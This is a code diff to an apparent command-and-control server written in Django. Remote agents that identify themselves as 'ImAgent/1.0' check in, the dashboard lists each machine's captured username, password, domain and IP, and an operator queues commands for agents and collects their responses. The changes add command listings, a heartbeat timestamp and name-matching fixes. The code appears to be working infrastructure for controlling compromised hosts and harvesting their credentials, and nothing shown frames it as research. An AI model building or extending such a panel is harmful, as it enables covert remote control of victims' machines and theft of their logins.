@@ -35,10 +35,13 @@ def get_client_ip(request):
 def create_or_get_users(request, id_name):
     agent = Clients.objects.filter(id_name=id_name).first()
     if agent:
+        if f'{agent.id_name} ImAgent/1.0' in request.META.get('HTTP_USER_AGENT'):
+            agent.last_update = now()
+            agent.save()
         return agent
     elif 'ImAgent/1.0' in request.META.get('HTTP_USER_AGENT'):
         agent = Clients.objects.create(id_name=id_name, address=get_client_ip(request))
-        agent.last_updated = now()
+        agent.last_update = now()
         agent.save()
         return agent
     else:
@@ -59,6 +62,16 @@ class IndexView(View):
         clients = Clients.objects.all()
         form = UploadsForm()
         client_list = {}
+        commands_list = {}
+
+        for client in clients:
+            commands = Commands.objects.filter(receiver=client)
+            for command in commands:
+                commands_list[client.id_name] = {
+                    'command': command.command,
+                    'response': command.response if command.response else '',
+                    'name': command.command.split(' ')[0]
+                }
 
         for client in clients:
             client_list[client.id_name] = {
@@ -67,15 +80,17 @@ class IndexView(View):
                 'username': client.username,
                 'password': client.password,
                 'domain': client.domain,
-                'ip': client.address,
+                'ip_address': client.ip_address,
                 'last_online_str': client.last_online_str(),
                 'last_online': client.last_online(),
             }
         json_data = json.dumps(client_list)
+        commands_json = json.dumps(commands_list)
         context = {
             'json_data': json_data,
             'form': form,
-            'clients': clients
+            'clients': clients,
+            'commands_json': commands_json,
         }
         return render(request, 'server_side/index.html', context)
 
@@ -83,8 +98,12 @@ class IndexView(View):
         clients = Clients.objects.all()
         if self.request.POST.get('command'):
             client_name = self.request.POST.get('cmd_btn')
+            client_name = client_name.split(' ')[2]
             print(client_name)
             receiver = create_or_get_users(request, client_name)
+            if not receiver:
+                client_name = client_name.lower()
+                receiver = create_or_get_users(request, client_name)
             print(receiver)
             Commands.objects.create(receiver=receiver,
                                     command=self.request.POST.get('command'))
@@ -142,7 +161,7 @@ class SendCommand(View):
         if cmd:
             cmd.is_executed = True
             response = re.sub(r'id\s*=\s*(\d+)', '', body).strip()
-            cmd.command_response = response
+            cmd.response = response
             cmd.save()
             return HttpResponse("Command executed successfully.", status=200)
 
